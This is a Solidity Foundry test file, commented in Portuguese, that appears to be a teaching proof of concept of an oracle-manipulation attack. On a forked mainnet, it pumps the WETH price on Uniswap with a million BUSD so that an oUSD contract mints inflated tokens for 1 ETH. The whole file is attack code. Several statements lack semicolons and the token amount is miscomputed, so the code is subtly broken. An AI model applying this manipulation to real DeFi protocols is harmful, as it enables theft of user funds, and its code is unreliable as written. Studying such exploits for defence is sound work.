// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;
import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/Oracle.sol";

contract OracleTest is Test {
    address private constant alice = address(1);
    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant BUSD = 0x4Fabb145d64652a948d72533023f6E7A623C7C53;
    address private constant ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    IUniswapV2Router router;
    IWETH private weth = IWETH(WETH);
    IBUSD private busd = IBUSD(BUSD);
    string MAINNET_RPC_URL;
    oUSD ousd;

    function setUp() public {
        MAINNET_RPC_URL = vm.envString("MAINNET_RPC_URL");
        // fork especifica um bloco
        vm.createSelectFork(MAINNET_RPC_URL,16060405);
        router = IUniswapV2Router(ROUTER);
        ousd = new oUSD();
    }

    //forge test --match-test testOracleAttack -vv
    function testOracleAttack() public {
        // Ataque ao oráculo
        // 0. Preço antes de manipular o oráculo
        uint256 priceBefore = ousd.getPrice();
        console.log("1. Preço do ETH (antes do ataque): %s", priceBefore)
        // Dê 1000000 BUSD para a sua conta
        uint busdAmount = 1_000_000 * 10e18;
        deal(BUSD, alice, busdAmount);
        // 2. Compre WETH com BUSD para impulsionar o preço em alta.
        vm.prank(alice);
        busd.transfer(address(this), busdAmount);
        swapBUSDtoWETH(busdAmount, 1);
        console.log("2. Troque 1.000.000 BUSD por WETH para manipular o oráculo")
        // 3. Preços após a manipulação do oráculo
        uint256 priceAfter = ousd.getPrice();
        console.log("3. Preço do ETH (após o ataque): %s", priceAfter)
        // 4. Fundição de oUSD
        ousd.swap{value: 1 ether}();
        console.log("4. Cunhou %s oUSD com 1 ETH (após o ataque)", ousd.balanceOf(address(this))/10e18)
    }

    // Trocar BUSD por WETH
    function swapBUSDtoWETH(uint amountIn, uint amountOutMin)
        public
        returns (uint amountOut)
    {   
        busd.approve(address(router), amountIn);

        address[] memory path;
        path = new address[](2);
        path[0] = BUSD;
        path[1] = WETH;

        uint[] memory amounts = router.swapExactTokensForTokens(
            amountIn,
            amountOutMin,
            path,
            alice,
            block.timestamp
        );

        // amounts[0] = valor BUSD, amounts[1] = valor WETH
        return amounts[1];
    }
}

interface IWETH is IERC20 {
    function deposit() external payable;

    function withdraw(uint amount) external;
}

interface IBUSD is IERC20 {
    function balanceOf(address account) external view returns (uint);
}

